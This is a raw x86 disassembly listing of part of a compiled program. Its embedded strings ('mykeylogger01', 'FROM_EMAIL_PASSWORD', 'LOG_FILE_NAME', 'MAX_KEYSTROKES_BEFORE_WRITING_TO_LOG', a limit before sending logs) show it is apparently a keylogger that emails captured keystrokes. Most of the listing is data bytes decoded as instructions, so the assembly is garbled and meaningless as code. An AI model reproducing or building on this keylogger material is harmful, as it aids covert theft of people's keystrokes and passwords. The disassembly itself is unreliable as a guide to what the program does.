  4025c6:	26 05 06 00 7a 03    	es add $0x37a0006,%eax
  4025cc:	26 05 06 00 b4 02    	es add $0x2b40006,%eax
  4025d2:	26 05 06 00 89 02    	es add $0x2890006,%eax
  4025d8:	03 06                	add    (%esi),%eax
  4025da:	06                   	push   %es
  4025db:	00 67 02             	add    %ah,0x2(%edi)
  4025de:	03 06                	add    (%esi),%eax
  4025e0:	06                   	push   %es
  4025e1:	00 e8                	add    %ch,%al
  4025e3:	02 26                	add    (%esi),%ah
  4025e5:	05 06 00 cf 02       	add    $0x2cf0006,%eax
  4025ea:	ef                   	out    %eax,(%dx)
  4025eb:	03 06                	add    (%esi),%eax
  4025ed:	00 da                	add    %bl,%dl
  4025ef:	06                   	push   %es
  4025f0:	00 05 06 00 7f 05    	add    %al,0x57f0006
  4025f6:	c6 00 06             	movb   $0x6,(%eax)
  4025f9:	00 c4                	add    %al,%ah
  4025fb:	05 c6 00 06 00       	add    $0x600c6,%eax
  402600:	3c 01                	cmp    $0x1,%al
  402602:	de 03                	fiadds (%ebx)
  402604:	06                   	push   %es
  402605:	00 63 05             	add    %ah,0x5(%ebx)
  402608:	00 05 0a 00 ce 06    	add    %al,0x6ce000a
  40260e:	80 06 06             	addb   $0x6,(%esi)
  402611:	00 a5 05 c6 00 0e    	add    %ah,0xe00c605(%ebp)
  402617:	00 1f                	add    %bl,(%edi)
  402619:	07                   	pop    %es
  40261a:	9c                   	pushf
  40261b:	04 0e                	add    $0xe,%al
  40261d:	00 9a 01 9c 04 06    	add    %bl,0x6049c01(%edx)
  402623:	00 1a                	add    %bl,(%edx)
  402625:	02 00                	add    (%eax),%al
  402627:	05 0e 00 2a 07       	add    $0x72a000e,%eax
  40262c:	9c                   	pushf
  40262d:	04 0e                	add    $0xe,%al
  40262f:	00 9f 06 f0 05 0e    	add    %bl,0xe05f006(%edi)
  402635:	00 e3                	add    %ah,%bl
  402637:	01 f0                	add    %esi,%eax
  402639:	05 06 00 48 02       	add    $0x2480006,%eax
  40263e:	00 05 06 00 0b 07    	add    %al,0x70b0006
  402644:	00 05 06 00 27 04    	add    %al,0x4270006
  40264a:	00 05 0a 00 1a 05    	add    %al,0x51a000a
  402650:	80 06 06             	addb   $0x6,(%esi)
  402653:	00 0b                	add    %cl,(%ebx)
  402655:	04 00                	add    $0x0,%al
  402657:	05 06 00 d1 05       	add    $0x5d10006,%eax
  40265c:	c6 00 06             	movb   $0x6,(%eax)
  40265f:	00 88 05 c6 00 06    	add    %cl,0x600c605(%eax)
  402665:	00 41 07             	add    %al,0x7(%ecx)
  402668:	de 03                	fiadds (%ebx)
  40266a:	06                   	push   %es
  40266b:	00 cc                	add    %cl,%ah
  40266d:	01 00                	add    %eax,(%eax)
  40266f:	05 06 00 e9 05       	add    $0x5e90006,%eax
  402674:	00 05 06 00 63 04    	add    %al,0x4630006
  40267a:	03 06                	add    (%esi),%eax
  40267c:	06                   	push   %es
  40267d:	00 b2 05 c6 00 0e    	add    %dh,0xe00c605(%edx)
  402683:	00 6e 01             	add    %ch,0x1(%esi)
  402686:	9c                   	pushf
  402687:	04 0e                	add    $0xe,%al
  402689:	00 6b 04             	add    %ch,0x4(%ebx)
  40268c:	f4                   	hlt
  40268d:	06                   	push   %es
  40268e:	0e                   	push   %cs
  40268f:	00 56 07             	add    %dl,0x7(%esi)
  402692:	f4                   	hlt
  402693:	06                   	push   %es
  402694:	0e                   	push   %cs
  402695:	00 a7 06 9c 04 06    	add    %ah,0x6049c06(%edi)
  40269b:	00 35 07 00 05 06    	add    %dh,0x6050007
  4026a1:	00 20                	add    %ah,(%eax)
  4026a3:	00 00                	add    %al,(%eax)
  4026a5:	05 0e 00 4e 05       	add    $0x54e000e,%eax
  4026aa:	9c                   	pushf
  4026ab:	04 06                	add    $0x6,%al
  4026ad:	00 0f                	add    %cl,(%edi)
  4026af:	00 7d 04             	add    %bh,0x4(%ebp)
  4026b2:	0e                   	push   %cs
  4026b3:	00 38                	add    %bh,(%eax)
  4026b5:	05 9c 04 00 00       	add    $0x49c,%eax
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	26 00 00             	add    %al,%es:(%eax)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	00 01                	add    %al,(%ecx)
  4026c3:	00 01                	add    %al,(%ecx)
  4026c5:	00 00                	add    %al,(%eax)
  4026c7:	00 10                	add    %dl,(%eax)
  4026c9:	00 f8                	add    %bh,%al
  4026cb:	04 01                	add    $0x1,%al
  4026cd:	00 41 00             	add    %al,0x0(%ecx)
  4026d0:	01 00                	add    %eax,(%eax)
  4026d2:	01 00                	add    %eax,(%eax)
  4026d4:	03 01                	add    (%ecx),%eax
  4026d6:	00 00                	add    %al,(%eax)
  4026d8:	17                   	pop    %ss
  4026d9:	01 00                	add    %eax,(%eax)
  4026db:	00 75 00             	add    %dh,0x0(%ebp)
  4026de:	0e                   	push   %cs
  4026df:	00 0b                	add    %cl,(%ebx)
  4026e1:	00 51 80             	add    %dl,-0x80(%ecx)
  4026e4:	d0 00                	rolb   $1,(%eax)
  4026e6:	fb                   	sti
  4026e7:	01 51 80             	add    %edx,-0x80(%ecx)
  4026ea:	2f                   	das
  4026eb:	00 fb                	add    %bh,%bl
  4026ed:	01 51 80             	add    %edx,-0x80(%ecx)
  4026f0:	e3 00                	jecxz  0x4026f2
  4026f2:	fb                   	sti
  4026f3:	01 51 80             	add    %edx,-0x80(%ecx)
  4026f6:	55                   	push   %ebp
  4026f7:	00 fb                	add    %bh,%bl
  4026f9:	01 51 80             	add    %edx,-0x80(%ecx)
  4026fc:	43                   	inc    %ebx
  4026fd:	00 fb                	add    %bh,%bl
  4026ff:	01 51 80             	add    %edx,-0x80(%ecx)
  402702:	f4                   	hlt
  402703:	00 fe                	add    %bh,%dh
  402705:	01 51 80             	add    %edx,-0x80(%ecx)
  402708:	88 00                	mov    %al,(%eax)
  40270a:	01 02                	add    %eax,(%edx)
  40270c:	51                   	push   %ecx
  40270d:	80 63 00 01          	andb   $0x1,0x0(%ebx)
  402711:	02 11                	add    (%ecx),%dl
  402713:	00 ac 00 01 02 11 00 	add    %ch,0x110201(%eax,%eax,1)
  40271a:	bb 00 01 02 11       	mov    $0x11020100,%ebx
  40271f:	00 5e 04             	add    %bl,0x4(%esi)
  402722:	84 00                	test   %al,(%eax)
  402724:	11 00                	adc    %eax,(%eax)
  402726:	2d 02 04 02 11       	sub    $0x11020402,%eax
  40272b:	00 bd 05 fb 01 50    	add    %bh,0x5001fb05(%ebp)
  402731:	20 00                	and    %al,(%eax)
  402733:	00 00                	add    %al,(%eax)
  402735:	00 91 00 15 05 08    	add    %dl,0x8051500(%ecx)
  40273b:	02 01                	add    (%ecx),%al
  40273d:	00 74 20 00          	add    %dh,0x0(%eax,%eiz,1)
  402741:	00 00                	add    %al,(%eax)
  402743:	00 91 00 35 04 0e    	add    %dl,0xe043500(%ecx)
  402749:	02 02                	add    (%edx),%al
  40274b:	00 a8 22 00 00 00    	add    %ch,0x22(%eax)
  402751:	00 96 00 ac 04 1a    	add    %dl,0x1a04ac00(%esi)
  402757:	00 05 00 40 24 00    	add    %al,0x244000
  40275d:	00 00                	add    %al,(%eax)
  40275f:	00 91 00 56 04 15    	add    %dl,0x15045600(%ecx)
  402765:	02 05 00 00 00 00    	add    0x0,%al
  40276b:	00 80 00 91 20 9e    	add    %al,-0x61df6f00(%eax)
  402771:	07                   	pop    %es
  402772:	1b 02                	sbb    (%edx),%eax
  402774:	06                   	push   %es
  402775:	00 00                	add    %al,(%eax)
  402777:	00 00                	add    %al,(%eax)
  402779:	00 80 00 91 20 8d    	add    %al,-0x72df6f00(%eax)
  40277f:	07                   	pop    %es
  402780:	23 02                	and    (%edx),%eax
  402782:	0a 00                	or     (%eax),%al
  402784:	00 00                	add    %al,(%eax)
  402786:	00 00                	add    %al,(%eax)
  402788:	80 00 91             	addb   $0x91,(%eax)
  40278b:	20 79 07             	and    %bh,0x7(%ecx)
  40278e:	2c 02                	sub    $0x2,%al
  402790:	0e                   	push   %cs
  402791:	00 00                	add    %al,(%eax)
  402793:	00 00                	add    %al,(%eax)
  402795:	00 80 00 91 20 bc    	add    %al,-0x43df6f00(%eax)
  40279b:	01 31                	add    %esi,(%ecx)
  40279d:	02 0f                	add    (%edi),%cl
  40279f:	00 80 24 00 00 00    	add    %al,0x24(%eax)
  4027a5:	00 86 18 dc 05 06    	add    %al,0x605dc18(%esi)
  4027ab:	00 10                	add    %dl,(%eax)
  4027ad:	00 89 24 00 00 00    	add    %cl,0x24(%ecx)
  4027b3:	00 91 18 e2 05 1a    	add    %dl,0x1a05e218(%ecx)
  4027b9:	00 10                	add    %dl,(%eax)
  4027bb:	00 00                	add    %al,(%eax)
  4027bd:	00 00                	add    %al,(%eax)
  4027bf:	00 03                	add    %al,(%ebx)
  4027c1:	00 86 18 dc 05 4c    	add    %al,0x4c05dc18(%esi)
  4027c7:	00 10                	add    %dl,(%eax)
  4027c9:	00 00                	add    %al,(%eax)
  4027cb:	00 00                	add    %al,(%eax)
  4027cd:	00 03                	add    %al,(%ebx)
  4027cf:	00 c6                	add    %al,%dh
  4027d1:	01 b5 01 36 02 12    	add    %esi,0x12023601(%ebp)
  4027d7:	00 00                	add    %al,(%eax)
  4027d9:	00 00                	add    %al,(%eax)
  4027db:	00 03                	add    %al,(%ebx)
  4027dd:	00 c6                	add    %al,%dh
  4027df:	01 b0 01 3d 02 15    	add    %esi,0x15023d01(%eax)
  4027e5:	00 00                	add    %al,(%eax)
  4027e7:	00 00                	add    %al,(%eax)
  4027e9:	00 03                	add    %al,(%ebx)
  4027eb:	00 c6                	add    %al,%dh
  4027ed:	01 a6 01 48 02 1a    	add    %esp,0x1a024801(%esi)
  4027f3:	00 00                	add    %al,(%eax)
  4027f5:	00 01                	add    %al,(%ecx)
  4027f7:	00 51 06             	add    %dl,0x6(%ecx)
  4027fa:	00 00                	add    %al,(%eax)
  4027fc:	01 00                	add    %eax,(%eax)
  4027fe:	88 01                	mov    %al,(%ecx)
  402800:	00 00                	add    %al,(%eax)
  402802:	02 00                	add    (%eax),%al
  402804:	f1                   	int1
  402805:	04 00                	add    $0x0,%al
  402807:	00 03                	add    %al,(%ebx)
  402809:	00 ea                	add    %ch,%dl
  40280b:	04 00                	add    $0x0,%al
  40280d:	00 01                	add    %al,(%ecx)
  40280f:	00 2c 01             	add    %ch,(%ecx,%eax,1)
  402812:	00 00                	add    %al,(%eax)
  402814:	01 00                	add    %eax,(%eax)
  402816:	4b                   	dec    %ebx
  402817:	04 00                	add    $0x0,%al
  402819:	00 02                	add    %al,(%edx)
  40281b:	00 88 01 00 00 03    	add    %cl,0x3000001(%eax)
  402821:	00 f1                	add    %dh,%cl
  402823:	04 00                	add    $0x0,%al
  402825:	00 04 00             	add    %al,(%eax,%eax,1)
  402828:	ea 04 00 00 01 00 4f 	ljmp   $0x4f00,$0x1000004
  40282f:	04 00                	add    $0x0,%al
  402831:	00 02                	add    %al,(%edx)
  402833:	00 10                	add    %dl,(%eax)
  402835:	05 00 00 03 00       	add    $0x30000,%eax
  40283a:	56                   	push   %esi
  40283b:	01 00                	add    %eax,(%eax)
  40283d:	00 04 00             	add    %al,(%eax,%eax,1)
  402840:	31 01                	xor    %eax,(%ecx)
  402842:	00 00                	add    %al,(%eax)
  402844:	01 00                	add    %eax,(%eax)
  402846:	4b                   	dec    %ebx
  402847:	04 00                	add    $0x0,%al
  402849:	00 01                	add    %al,(%ecx)
  40284b:	00 00                	add    %al,(%eax)
  40284d:	02 00                	add    (%eax),%al
  40284f:	00 01                	add    %al,(%ecx)
  402851:	00 e1                	add    %ah,%cl
  402853:	06                   	push   %es
  402854:	00 00                	add    %al,(%eax)
  402856:	02 00                	add    (%eax),%al
  402858:	81 01 00 00 01 00    	addl   $0x10000,(%ecx)
  40285e:	88 01                	mov    %al,(%ecx)
  402860:	00 00                	add    %al,(%eax)
  402862:	02 00                	add    (%eax),%al
  402864:	f1                   	int1
  402865:	04 00                	add    $0x0,%al
  402867:	00 03                	add    %al,(%ebx)
  402869:	00 ea                	add    %ch,%dl
  40286b:	04 00                	add    $0x0,%al
  40286d:	00 01                	add    %al,(%ecx)
  40286f:	00 88 01 00 00 02    	add    %cl,0x2000001(%eax)
  402875:	00 f1                	add    %dh,%cl
  402877:	04 00                	add    $0x0,%al
  402879:	00 03                	add    %al,(%ebx)
  40287b:	00 ea                	add    %ch,%dl
  40287d:	04 00                	add    $0x0,%al
  40287f:	00 04 00             	add    %al,(%eax,%eax,1)
  402882:	42                   	inc    %edx
  402883:	04 00                	add    $0x0,%al
  402885:	00 05 00 e1 06 00    	add    %al,0x6e100
  40288b:	00 01                	add    %al,(%ecx)
  40288d:	00 18                	add    %bl,(%eax)
  40288f:	07                   	pop    %es
  402890:	09 00                	or     %eax,(%eax)
  402892:	dc 05 01 00 11 00    	faddl  0x110001
  402898:	dc 05 06 00 19 00    	faddl  0x190006
  40289e:	dc 05 0a 00 29 00    	faddl  0x29000a
  4028a4:	dc 05 10 00 31 00    	faddl  0x310010
  4028aa:	dc 05 10 00 39 00    	faddl  0x390010
  4028b0:	dc 05 10 00 41 00    	faddl  0x410010
  4028b6:	dc 05 10 00 49 00    	faddl  0x490010
  4028bc:	dc 05 10 00 51 00    	faddl  0x510010
  4028c2:	dc 05 10 00 59 00    	faddl  0x590010
  4028c8:	dc 05 10 00 61 00    	faddl  0x610010
  4028ce:	dc 05 15 00 69 00    	faddl  0x690015
  4028d4:	dc 05 10 00 71 00    	faddl  0x710010
  4028da:	dc 05 10 00 79 00    	faddl  0x790010
  4028e0:	dc 05 10 00 01 01    	faddl  0x1010010
  4028e6:	6d                   	insl   (%dx),%es:(%edi)
  4028e7:	05 1a 00 09 01       	add    $0x109001a,%eax
  4028ec:	12 04 33             	adc    (%ebx,%esi,1),%al
  4028ef:	00 91 00 dc 05 37    	add    %dl,0x3705dc00(%ecx)
  4028f5:	00 11                	add    %dl,(%ecx)
  4028f7:	01 61 02             	add    %esp,0x2(%ecx)
  4028fa:	10 00                	adc    %al,(%eax)
  4028fc:	11 01                	adc    %eax,(%ecx)
  4028fe:	3a 02                	cmp    (%edx),%al
  402900:	06                   	push   %es
  402901:	00 89 00 dc 05 10    	add    %cl,0x1005dc00(%ecx)
  402907:	00 19                	add    %bl,(%ecx)
  402909:	01 c3                	add    %eax,%ebx
  40290b:	06                   	push   %es
  40290c:	3d 00 89 00 12       	cmp    $0x12008900,%eax
  402911:	04 41                	add    $0x41,%al
  402913:	00 89 00 78 05 45    	add    %cl,0x45057800(%ecx)
  402919:	00 19                	add    %bl,(%ecx)
  40291b:	01 5a 02             	add    %ebx,0x2(%edx)
  40291e:	06                   	push   %es
  40291f:	00 21                	add    %ah,(%ecx)
  402921:	01 dc                	add    %ebx,%esp
  402923:	05 4c 00 99 00       	add    $0x99004c,%eax
  402928:	dc 05 52 00 29 01    	faddl  0x1290052
  40292e:	69 07 59 00 11 01    	imul   $0x1110059,(%edi),%eax
  402934:	23 02                	and    (%edx),%eax
  402936:	10 00                	adc    %al,(%eax)
  402938:	99                   	cltd
  402939:	00 47 07             	add    %al,0x7(%edi)
  40293c:	06                   	push   %es
  40293d:	00 a1 00 8e 01 5f    	add    %ah,0x5f018e00(%ecx)
  402943:	00 31                	add    %dh,(%ecx)
  402945:	01 ff                	add    %edi,%edi
  402947:	06                   	push   %es
  402948:	63 00                	arpl   %eax,(%eax)
  40294a:	31 01                	xor    %eax,(%ecx)
  40294c:	be 07 68 00 39       	mov    $0x39006807,%esi
  402951:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402954:	6e                   	outsb  %ds:(%esi),(%dx)
  402955:	00 81 00 09 04 5f    	add    %al,0x5f040900(%ecx)
  40295b:	00 09                	add    %cl,(%ecx)
  40295d:	01 be 07 73 00 09    	add    %edi,0x9007307(%esi)
  402963:	01 d3                	add    %edx,%ebx
  402965:	06                   	push   %es
  402966:	79 00                	jns    0x402968
  402968:	11 01                	adc    %eax,(%ecx)
  40296a:	61                   	popa
  40296b:	02 7f 00             	add    0x0(%edi),%bh
  40296e:	31 01                	xor    %eax,(%ecx)
  402970:	97                   	xchg   %eax,%edi
  402971:	05 84 00 b1 00       	add    $0xb10084,%eax
  402976:	dc 05 10 00 41 01    	faddl  0x1410010
  40297c:	47                   	inc    %edi
  40297d:	01 5f 00             	add    %ebx,0x0(%edi)
  402980:	41                   	inc    %ecx
  402981:	01 3a                	add    %edi,(%edx)
  402983:	02 06                	add    (%esi),%al
  402985:	00 b9 00 dc 05 10    	add    %bh,0x1005dc00(%ecx)
  40298b:	00 b9 00 4d 07 01    	add    %bh,0x1074d00(%ecx)
  402991:	00 b9 00 5b 01 9b    	add    %bh,-0x64fea500(%ecx)
  402997:	00 b9 00 66 06 15    	add    %bh,0x15066600(%ecx)
  40299d:	00 51 01             	add    %dl,0x1(%ecx)
  4029a0:	dc 05 a2 00 b9 00    	faddl  0xb900a2
  4029a6:	56                   	push   %esi
  4029a7:	06                   	push   %es
  4029a8:	a8 00                	test   $0x0,%al
  4029aa:	b9 00 dc 04 15       	mov    $0x1504dc00,%ecx
  4029af:	00 c1                	add    %al,%cl
  4029b1:	00 dc                	add    %bl,%ah
  4029b3:	05 06 00 61 01       	add    $0x1610006,%eax
  4029b8:	dc 05 10 00 c1 00    	faddl  0xc10010
  4029be:	07                   	pop    %es
  4029bf:	05 af 00 69 01       	add    $0x16900af,%eax
  4029c4:	0d 02 b6 00 c9       	or     $0xc900b602,%eax
  4029c9:	00 71 07             	add    %dh,0x7(%ecx)
  4029cc:	ba 00 c9 00 1d       	mov    $0x1d00c900,%edx
  4029d1:	04 33                	add    $0x33,%al
  4029d3:	00 71 01             	add    %dh,0x1(%ecx)
  4029d6:	09 04 5f             	or     %eax,(%edi,%ebx,2)
  4029d9:	00 c9                	add    %cl,%cl
  4029db:	00 ad 07 33 00 c9    	add    %ch,-0x36ffccf9(%ebp)
  4029e1:	00 9c 05 33 00 09 01 	add    %bl,0x1090033(%ebp,%eax,1)
  4029e8:	d3 06                	roll   %cl,(%esi)
  4029ea:	bf 00 c1 00 e8       	mov    $0xe800c100,%edi
  4029ef:	06                   	push   %es
  4029f0:	10 00                	adc    %al,(%eax)
  4029f2:	c1 00 b5             	roll   $0xb5,(%eax)
  4029f5:	07                   	pop    %es
  4029f6:	10 00                	adc    %al,(%eax)
  4029f8:	c1 00 cd             	roll   $0xcd,(%eax)
  4029fb:	04 15                	add    $0x15,%al
  4029fd:	00 d1                	add    %dl,%cl
  4029ff:	00 dc                	add    %bl,%ah
  402a01:	05 a2 00 c1 00       	add    $0xc100a2,%eax
  402a06:	b3 06                	mov    $0x6,%bl
  402a08:	c5 00                	lds    (%eax),%eax
  402a0a:	0c 00                	or     $0x0,%al
  402a0c:	43                   	inc    %ebx
  402a0d:	01 d3                	add    %edx,%ebx
  402a0f:	00 c1                	add    %al,%cl
  402a11:	00 71 05             	add    %dh,0x5(%ecx)
  402a14:	d9 00                	flds   (%eax)
  402a16:	89 01                	mov    %eax,(%ecx)
  402a18:	43                   	inc    %ebx
  402a19:	01 10                	add    %edx,(%eax)
  402a1b:	00 b9 00 51 01 df    	add    %bh,-0x20feaf00(%ecx)
  402a21:	00 c1                	add    %al,%cl
  402a23:	00 40 02             	add    %al,0x2(%eax)
  402a26:	06                   	push   %es
  402a27:	00 d9                	add    %bl,%cl
  402a29:	00 95 06 ef 00 d9    	add    %dl,-0x26ff10fa(%ebp)
  402a2f:	00 d4                	add    %dl,%ah
  402a31:	01 f4                	add    %esi,%esp
  402a33:	00 e1                	add    %ah,%cl
  402a35:	00 f1                	add    %dh,%cl
  402a37:	01 5f 00             	add    %ebx,0x0(%edi)
  402a3a:	81 00 dc 05 06 00    	addl   $0x605dc,(%eax)
  402a40:	0e                   	push   %cs
  402a41:	00 04 00             	add    %al,(%eax,%eax,1)
  402a44:	02 01                	add    (%ecx),%al
  402a46:	0e                   	push   %cs
  402a47:	00 08                	add    %cl,(%eax)
  402a49:	00 37                	add    %dh,(%edi)
  402a4b:	01 0e                	add    %ecx,(%esi)
  402a4d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402a50:	48                   	dec    %eax
  402a51:	01 0e                	add    %ecx,(%esi)
  402a53:	00 10                	add    %dl,(%eax)
  402a55:	00 7d 01             	add    %bh,0x1(%ebp)
  402a58:	0e                   	push   %cs
  402a59:	00 14 00             	add    %dl,(%eax,%eax,1)
  402a5c:	ae                   	scas   %es:(%edi),%al
  402a5d:	01 02                	add    %eax,(%edx)
  402a5f:	00 18                	add    %bl,(%eax)
  402a61:	00 ef                	add    %ch,%bh
  402a63:	01 08                	add    %ecx,(%eax)
  402a65:	00 1c 00             	add    %bl,(%eax,%eax,1)
  402a68:	f1                   	int1
  402a69:	01 08                	add    %ecx,(%eax)
  402a6b:	00 20                	add    %ah,(%eax)
  402a6d:	00 f6                	add    %dh,%dh
  402a6f:	01 2e                	add    %ebp,(%esi)
  402a71:	00 0b                	add    %cl,(%ebx)
  402a73:	00 4e 02             	add    %cl,0x2(%esi)
  402a76:	2e 00 13             	add    %dl,%cs:(%ebx)
  402a79:	00 57 02             	add    %dl,0x2(%edi)
  402a7c:	2e 00 1b             	add    %bl,%cs:(%ebx)
  402a7f:	00 76 02             	add    %dh,0x2(%esi)
  402a82:	2e 00 23             	add    %ah,%cs:(%ebx)
  402a85:	00 7f 02             	add    %bh,0x2(%edi)
  402a88:	2e 00 2b             	add    %ch,%cs:(%ebx)
  402a8b:	00 92 02 2e 00 33    	add    %dl,0x33002e02(%edx)
  402a91:	00 92 02 2e 00 3b    	add    %dl,0x3b002e02(%edx)
  402a97:	00 92 02 2e 00 43    	add    %dl,0x43002e02(%edx)
  402a9d:	00 7f 02             	add    %bh,0x2(%edi)
  402aa0:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  402aa4:	98                   	cwtl
  402aa5:	02 2e                	add    (%esi),%ch
  402aa7:	00 53 00             	add    %dl,0x0(%ebx)
  402aaa:	92                   	xchg   %eax,%edx
  402aab:	02 2e                	add    (%esi),%ch
  402aad:	00 5b 00             	add    %bl,0x0(%ebx)
  402ab0:	92                   	xchg   %eax,%edx
  402ab1:	02 2e                	add    (%esi),%ch
  402ab3:	00 63 00             	add    %ah,0x0(%ebx)
  402ab6:	b0 02                	mov    $0x2,%al
  402ab8:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  402abc:	da 02                	fiaddl (%edx)
  402abe:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  402ac2:	e7 02                	out    %eax,$0x2
  402ac4:	1e                   	push   %ds
  402ac5:	00 87 00 e5 00 c2    	add    %al,-0x3dff1b00(%edi)
  402acb:	04 b5                	add    $0xb5,%al
  402acd:	04 cb                	add    $0xcb,%al
  402acf:	00 00                	add    %al,(%eax)
  402ad1:	01 0b                	add    %ecx,(%ebx)
  402ad3:	00 9e 07 01 00 00    	add    %bl,0x107(%esi)
  402ad9:	01 0d 00 8d 07 01    	add    %ecx,0x1078d00
  402adf:	00 00                	add    %al,(%eax)
  402ae1:	01 0f                	add    %ecx,(%edi)
  402ae3:	00 79 07             	add    %bh,0x7(%ecx)
  402ae6:	01 00                	add    %eax,(%eax)
  402ae8:	00 01                	add    %al,(%ecx)
  402aea:	11 00                	adc    %eax,(%eax)
  402aec:	bc 01 02 00 04       	mov    $0x4000201,%esp
  402af1:	80 00 00             	addb   $0x0,(%eax)
  402af4:	01 00                	add    %eax,(%eax)
	...
  402b02:	01 00                	add    %eax,(%eax)
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 00                	add    $0x0,%al
	...
  402b10:	00 00                	add    %al,(%eax)
  402b12:	f9                   	stc
  402b13:	00 0e                	add    %cl,(%esi)
  402b15:	01 00                	add    %eax,(%eax)
  402b17:	00 00                	add    %al,(%eax)
  402b19:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  402b24:	00 00                	add    %al,(%eax)
  402b26:	f9                   	stc
  402b27:	00 80 06 00 00 00    	add    %al,0x6(%eax)
  402b2d:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  402b38:	00 00                	add    %al,(%eax)
  402b3a:	f9                   	stc
  402b3b:	00 00                	add    %al,(%eax)
  402b3d:	05 00 00 00 00       	add    $0x0,%eax
  402b42:	03 00                	add    (%eax),%eax
  402b44:	02 00                	add    (%eax),%al
  402b46:	00 00                	add    %al,(%eax)
  402b48:	00 6d 79             	add    %ch,0x79(%ebp)
  402b4b:	6b 65 79 6c          	imul   $0x6c,0x79(%ebp),%esp
  402b4f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b50:	67 67 65 72 30       	addr16 addr16 gs jb 0x402b85
  402b55:	31 00                	xor    %eax,(%eax)
  402b57:	43                   	inc    %ebx
  402b58:	6f                   	outsl  %ds:(%esi),(%dx)
  402b59:	6c                   	insb   (%dx),%es:(%edi)
  402b5a:	6c                   	insb   (%dx),%es:(%edi)
  402b5b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402b60:	6e                   	outsb  %ds:(%esi),(%dx)
  402b61:	60                   	pusha
  402b62:	31 00                	xor    %eax,(%eax)
  402b64:	52                   	push   %edx
  402b65:	65 61                	gs popa
  402b67:	64 49                	fs dec %ecx
  402b69:	6e                   	outsb  %ds:(%esi),(%dx)
  402b6a:	74 33                	je     0x402b9f
  402b6c:	32 00                	xor    (%eax),%al
  402b6e:	3c 4d                	cmp    $0x4d,%al
  402b70:	6f                   	outsl  %ds:(%esi),(%dx)
  402b71:	64 75 6c             	fs jne 0x402be0
  402b74:	65 3e 00 46 52       	gs add %al,%ds:0x52(%esi)
  402b79:	4f                   	dec    %edi
  402b7a:	4d                   	dec    %ebp
  402b7b:	5f                   	pop    %edi
  402b7c:	45                   	inc    %ebp
  402b7d:	4d                   	dec    %ebp
  402b7e:	41                   	inc    %ecx
  402b7f:	49                   	dec    %ecx
  402b80:	4c                   	dec    %esp
  402b81:	5f                   	pop    %edi
  402b82:	50                   	push   %eax
  402b83:	41                   	inc    %ecx
  402b84:	53                   	push   %ebx
  402b85:	53                   	push   %ebx
  402b86:	57                   	push   %edi
  402b87:	4f                   	dec    %edi
  402b88:	52                   	push   %edx
  402b89:	44                   	inc    %esp
  402b8a:	00 41 52             	add    %al,0x52(%ecx)
  402b8d:	43                   	inc    %ebx
  402b8e:	48                   	dec    %eax
  402b8f:	49                   	dec    %ecx
  402b90:	56                   	push   %esi
  402b91:	45                   	inc    %ebp
  402b92:	5f                   	pop    %edi
  402b93:	46                   	inc    %esi
  402b94:	49                   	dec    %ecx
  402b95:	4c                   	dec    %esp
  402b96:	45                   	inc    %ebp
  402b97:	5f                   	pop    %edi
  402b98:	4e                   	dec    %esi
  402b99:	41                   	inc    %ecx
  402b9a:	4d                   	dec    %ebp
  402b9b:	45                   	inc    %ebp
  402b9c:	00 4c 4f 47          	add    %cl,0x47(%edi,%ecx,2)
  402ba0:	5f                   	pop    %edi
  402ba1:	46                   	inc    %esi
  402ba2:	49                   	dec    %ecx
  402ba3:	4c                   	dec    %esp
  402ba4:	45                   	inc    %ebp
  402ba5:	5f                   	pop    %edi
  402ba6:	4e                   	dec    %esi
  402ba7:	41                   	inc    %ecx
  402ba8:	4d                   	dec    %ebp
  402ba9:	45                   	inc    %ebp
  402baa:	00 4d 41             	add    %cl,0x41(%ebp)
  402bad:	58                   	pop    %eax
  402bae:	5f                   	pop    %edi
  402baf:	4b                   	dec    %ebx
  402bb0:	45                   	inc    %ebp
  402bb1:	59                   	pop    %ecx
  402bb2:	53                   	push   %ebx
  402bb3:	54                   	push   %esp
  402bb4:	52                   	push   %edx
  402bb5:	4f                   	dec    %edi
  402bb6:	4b                   	dec    %ebx
  402bb7:	45                   	inc    %ebp
  402bb8:	53                   	push   %ebx
  402bb9:	5f                   	pop    %edi
  402bba:	42                   	inc    %edx
  402bbb:	45                   	inc    %ebp
  402bbc:	46                   	inc    %esi
  402bbd:	4f                   	dec    %edi
  402bbe:	52                   	push   %edx
  402bbf:	45                   	inc    %ebp
  402bc0:	5f                   	pop    %edi
  402bc1:	57                   	push   %edi
  402bc2:	52                   	push   %edx
  402bc3:	49                   	dec    %ecx
  402bc4:	54                   	push   %esp
  402bc5:	49                   	dec    %ecx
  402bc6:	4e                   	dec    %esi
  402bc7:	47                   	inc    %edi
  402bc8:	5f                   	pop    %edi
  402bc9:	54                   	push   %esp
  402bca:	4f                   	dec    %edi
  402bcb:	5f                   	pop    %edi
  402bcc:	4c                   	dec    %esp
  402bcd:	4f                   	dec    %edi
  402bce:	47                   	inc    %edi
  402bcf:	00 4d 41             	add    %cl,0x41(%ebp)
  402bd2:	58                   	pop    %eax
  402bd3:	5f                   	pop    %edi
  402bd4:	4c                   	dec    %esp
  402bd5:	4f                   	dec    %edi
  402bd6:	47                   	inc    %edi
  402bd7:	5f                   	pop    %edi
  402bd8:	4c                   	dec    %esp
  402bd9:	45                   	inc    %ebp
  402bda:	4e                   	dec    %esi
  402bdb:	47                   	inc    %edi
  402bdc:	54                   	push   %esp
  402bdd:	48                   	dec    %eax
  402bde:	5f                   	pop    %edi
  402bdf:	42                   	inc    %edx
  402be0:	45                   	inc    %ebp
  402be1:	46                   	inc    %esi
  402be2:	4f                   	dec    %edi
  402be3:	52                   	push   %edx
  402be4:	45                   	inc    %ebp
  402be5:	5f                   	pop    %edi
  402be6:	53                   	push   %ebx
  402be7:	45                   	inc    %ebp
  402be8:	4e                   	dec    %esi
  402be9:	44                   	inc    %esp
  402bea:	49                   	dec    %ecx
  402beb:	4e                   	dec    %esi
  402bec:	47                   	inc    %edi
  402bed:	5f                   	pop    %edi
  402bee:	45                   	inc    %ebp
